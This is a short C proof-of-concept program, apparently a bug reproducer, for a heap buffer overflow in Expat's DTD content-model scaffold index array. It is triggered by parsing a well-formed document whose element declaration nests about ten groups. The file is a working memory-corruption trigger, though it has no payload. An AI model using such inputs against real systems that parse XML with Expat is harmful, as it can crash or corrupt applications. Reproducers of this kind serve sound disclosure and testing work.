/* PoC: heap buffer overflow in the DTD content-model scaffold index array.
 *
 * Expat builds an internal "scaffold" while parsing an element declaration's
 * content model.  The per-nesting-level index array (dtd->scaffIndex) is
 * grown in doProlog() as the group nesting deepens.  On the shipped tree the
 * initial size of that array no longer matches the capacity check that guards
 * the growth, so a content model with a handful of nested groups writes one
 * past the end of the heap allocation.
 *
 * Driven entirely through the public API with a well-formed document: an
 * element declaration handler is registered (which is what makes Expat build
 * the content-model scaffold at all) and a document with a nested content
 * model is parsed.
 */
#include <stdio.h>
#include <string.h>

#include "expat.h"

static void XMLCALL
handle_element_decl(void *userData, const XML_Char *name, XML_Content *model) {
  (void)userData;
  (void)name;
  XML_FreeContentModel((XML_Parser)userData, model);
}

int
main(void) {
  static const char doc[]
      = "<!DOCTYPE r [\n"
        "<!ELEMENT r (((((((((( (a) ))))))))))>\n"
        "<!ELEMENT a (#PCDATA)>\n"
        "]>\n"
        "<r><a/></r>";

  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL) {
    fprintf(stderr, "could not create parser\n");
    return 2;
  }
  XML_SetUserData(parser, parser);
  XML_SetElementDeclHandler(parser, handle_element_decl);

  enum XML_Status status
      = XML_Parse(parser, doc, (int)strlen(doc), /*isFinal=*/1);
  if (status != XML_STATUS_OK) {
    fprintf(stderr, "parse error: %s\n",
            XML_ErrorString(XML_GetErrorCode(parser)));
  }
  XML_ParserFree(parser);
  return 0;
}
